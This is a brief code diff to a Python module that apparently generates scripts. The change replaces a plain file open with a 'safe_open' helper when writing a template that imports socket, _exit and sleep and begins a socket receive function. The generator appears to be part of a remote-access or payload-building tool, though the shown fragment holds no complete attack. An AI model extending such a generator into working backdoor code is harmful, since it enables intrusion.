@@ -1,5 +1,6 @@
 # verified
 import library.modules.config as config
+import library.modules.safe_open as safe_open
 
 config.main()
 
@@ -14,7 +15,7 @@ def main(option):
         config.import_statements.append('import socket')
         config.import_statements.append('from os import _exit')
         config.import_statements.append('from time import sleep')
-        f = open(filepath, 'w')
+        f = safe_open.main(filepath, 'w')
         f.write('''
 def recv_all(sock):
     sock.settimeout(None)
